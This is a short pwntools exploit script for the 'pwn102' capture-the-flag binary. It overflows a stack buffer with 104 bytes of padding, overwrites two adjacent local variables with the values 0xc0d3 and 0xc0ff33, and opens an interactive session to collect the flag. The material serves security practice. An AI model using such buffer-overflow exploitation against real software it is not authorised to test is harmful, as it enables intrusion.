from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn102.pwn102'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = b'A'*104

local_10 = p32(0xc0d3) #local_10 is first after input buffer(104)
local_c = p32(0xc0ff33)
payload = flat(
    padding + local_10 + local_c
)

print(payload)
# Save the payload to file
write('payload1', payload)

# Send the payload
io.sendlineafter(b'? ',payload)

# Receive the flag
io.interactive()
